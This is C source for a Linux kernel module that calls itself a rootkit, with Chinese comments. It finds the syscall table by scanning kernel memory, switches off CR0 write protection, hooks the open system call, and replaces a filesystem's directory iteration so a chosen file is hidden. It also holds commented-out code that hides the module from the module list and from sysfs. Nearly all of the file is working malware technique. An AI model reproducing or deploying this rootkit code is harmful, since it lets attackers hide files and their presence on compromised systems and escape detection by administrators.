#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h> 
#include <linux/syscalls.h>
#include <linux/fs.h>

//需要隐藏的文件
#define HIDE_FILE "hidefile"

unsigned long **sys_call_table;

/*
更改cr0寄存器的16位来改变读写保护
*/
void enable_write_protection(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	write_cr0(cr0);
}

void disable_write_protection(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	write_cr0(cr0);
}

/*
根据内核导出的函数sys_close，遍历内核地址空间来寻找系统调用表
*/
unsigned long ** get_sys_call_table(void)
{
	unsigned long **entry = (unsigned long **)PAGE_OFFSET;
	for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
		if (entry[__NR_close] == (unsigned long *)sys_close) {
			return entry;
		}
	}
	return NULL;
}

/*
hook open系统调用
*/
long (*real_open)(const char*, int, umode_t);

asmlinkage long fake_open(const char __user *filename, int flags, umode_t mode)
{
	printk("[rootkit]:hook open file %s\n",filename);
	return real_open(filename, flags, mode);
}

/*
*/
#define set_file_op(op, path, new, old)                       \
	do {                                                    \
		struct file *filp;                                  \
		struct file_operations *f_op;                       \
                                                            \
		printk("Opening the path: %s.\n", path);          \
		filp = filp_open(path, O_RDONLY, 0);                \
		if (IS_ERR(filp)) {                                 \
			printk("Failed to open %s with error %ld.\n", path, PTR_ERR(filp));\
			old = NULL;                                     \
		} else {                                            \
			printk("Succeeded in opening: %s\n", path);   \
			f_op = (struct file_operations *)filp->f_op;    \
			old = f_op->op;                                 \
			printk("Changing iterate from %p to %p.\n", old, new);                             \
			disable_write_protection();                     \
			f_op->op = new;                                 \
			enable_write_protection();                      \
		}                                                   \
	} while(0)

int (*real_iterate)(struct file *filp, struct dir_context *ctx);
int (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_iterate(struct file *filp, struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_iterate(struct file *filp, struct dir_context *ctx)
{
	real_filldir = ctx->actor;
	*(filldir_t *)&ctx->actor = fake_filldir;

	return real_iterate(filp, ctx);
}

int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
	if (strcmp(name, HIDE_FILE) == 0) {
		printk("Hiding: %s", name);
		return 0;
	}
	return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

static int rootkit_init(void)
{
	//删除模块
	//list_del_init(&__this_module.list);

	//删除sysfs
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	//printk("[rootkit]: sys_call_table is at %p\n", get_sys_call_table());
	
	//获取系统调用表
	sys_call_table = get_sys_call_table();
	
	//钩住open系统调用
	/*
	disable_write_protection();
	real_open = (void *)sys_call_table[__NR_open];
	sys_call_table[__NR_open] = (unsigned long*)fake_open;
	enable_write_protection();
	*/
	//隐藏文件
	//set_file_op(iterate, "/", fake_iterate, real_iterate);


	printk("[rootkit]: loaded\n");
	printk("[rootkit]: %p\n", sys_call_table);
	return 0;
}
 
static void rootkit_exit(void)
{
	//删除open系统调用的钩子
	/*
	disable_write_protection();
	sys_call_table[__NR_open] = (unsigned long*)real_open;
	enable_write_protection();
	*/
	//恢复文件的显示
	/*
	void *dummy;
	set_file_op(iterate, "/", real_iterate, dummy);
	*/

	printk("[rootkit]: removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
